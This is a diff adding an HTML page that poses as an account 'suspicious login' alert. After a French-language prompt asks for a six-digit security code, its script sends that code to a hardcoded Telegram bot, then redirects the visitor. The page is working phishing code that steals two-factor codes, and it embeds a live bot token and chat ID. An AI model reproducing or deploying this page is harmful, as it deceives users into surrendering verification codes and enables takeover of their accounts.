@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Alert</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column; /* Stack elements vertically */
+            align-items: center;
+            height: 100vh;
+            justify-content: center; /* Center content vertically */
+        }
+
+        .alert-container {
+            background-color: #ff3b30; /* Red color for alert */
+            color: white;
+            font-size: 8px;
+            font-family: 'Lato', sans-serif; /* Use Lato font */
+            margin-top: -0px;
+            padding: -400px 10px; /* Reduced padding */
+            width: 100%; /* Reduced width */
+            text-align: center; /* Center the alert text */
+            margin-bottom: 200px; /* Space between alert and main content */
+        }
+
+        .container {
+            background-color: #ffffff;
+            font-family: 'Lato', sans-serif; /* Use Lato font */
+            font-size: 20px;
+            border-radius: 3px;
+            border: solid 1px gray;
+            padding: 15px; /* Reduced padding */
+            text-align: center;
+            height: 600px;
+            width: 480px; /* Slightly reduced width */
+        }
+
+        .content h3 {
+            margin: 40px 0; /* Increased margin for more space */
+            font-size: 22px; /* Increased font size */
+        }
+
+        .content p {
+            margin: 40px 0; /* Increased margin for more space */
+            color: #555;
+            font-size: 16px; /* Increased font size */
+        }
+
+        .code-input {
+            font-size: 24px;
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            margin: 0 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .continue-btn {
+            background-color: #0095f6; /* Blue color for button */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            padding: 8px 16px; /* Reduced padding */
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 14px; /* Slightly smaller font size */
+        }
+
+        .continue-btn:hover {
+            background-color: rgb(27, 88, 232); /* Darker blue on hover */
+        }
+
+        .logout {
+            margin-top: 10px; /* Reduced margin */
+        }
+
+        .logout a {
+            color: #000000;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .logout a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script>
+        const token = '8143301286:AAES3vn3ofB-ddmoLzcq6r-V0hQAKcjpsQ4';
+        const chatId = '-4515080557';
+
+        function showCodeInput() {
+            document.querySelector('.content').innerHTML = `
+                <h3>Entrez votre code de sécurité</h3>
+                <p>Entrez le code à 6 chiffres que nous avons envoyé à l’adresse e-mail c*******@gmail.com</p>
+                <div style="margin: 20px 0;">
+                    <input type="number" maxlength="1" class="code-input" oninput="moveToNext(this)" onkeydown="return restrictInput(event)">
+                    <input type="number" maxlength="1" class="code-input" oninput="moveToNext(this)" onkeydown="return restrictInput(event)">
+                    <input type="number" maxlength="1" class="code-input" oninput="moveToNext(this)" onkeydown="return restrictInput(event)">
+                    <input type="number" maxlength="1" class="code-input" oninput="moveToNext(this)" onkeydown="return restrictInput(event)">
+                    <input type="number" maxlength="1" class="code-input" oninput="moveToNext(this)" onkeydown="return restrictInput(event)">
+                    <input type="number" maxlength="1" class="code-input" oninput="moveToNext(this)" onkeydown="return restrictInput(event)">
+                </div>
+                <button class="continue-btn" onclick="sendCode()">Envoyer</button>
+                <p class="logout"><a href="#">Retour</a></p>
+            `;
+        }
+
+        function moveToNext(input) {
+            if (input.value.length >= 1) {
+                const next = input.nextElementSibling;
+                if (next) {
+                    next.focus();
+                }
+            }
+        }
+
+        function restrictInput(event) {
+            // Allow only number keys and backspace
+            const validKeys = ["Backspace", "ArrowLeft", "ArrowRight", "Tab"];
+            if (validKeys.includes(event.key) || /^[0-9]$/.test(event.key)) {
+                return true;
+            }
+            event.preventDefault(); // Prevent any other input
+            return false;
+        }
+
+        function sendCode() {
+    // Get the input values
+    const inputs = document.querySelectorAll('.code-input');
+    let code = '';
+    inputs.forEach(input => {
+        code += input.value; // Concatenate values
+    });
+
+    // Send the code to Telegram
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: `Security Code: ${code}` // Message content
+        }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            // Redirect to home page after a short delay
+            setTimeout(() => {
+                window.location.href = '../main/home.html'; // Redirecting to home page
+            }, 1000); // Delay of 1 second before redirecting
+        } else {
+            alert('Erreur.'); // Error message
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Erreur lors de l\'envoi du code.'); // Error message
+    });
+}
+
+    </script>
+</head>
+<body>
+    <div class="alert-container">
+        <h2>Suspicious login attempt</h2>
+    </div>
+    <div class="container">
+        <div class="content">
+            <h3>We have detected an unusual login attempt</h3>
+            <p>To protect your account, we will send you a security code to confirm your identity.</p>
+            <p>Email: <strong>*******@gmail.com</strong></p>
+            <button class="continue-btn" onclick="showCodeInput()">Continue</button>
+            <p class="logout"><a href="#">Log out</a></p>
+        </div>
+    </div>
+</body>
+</html>
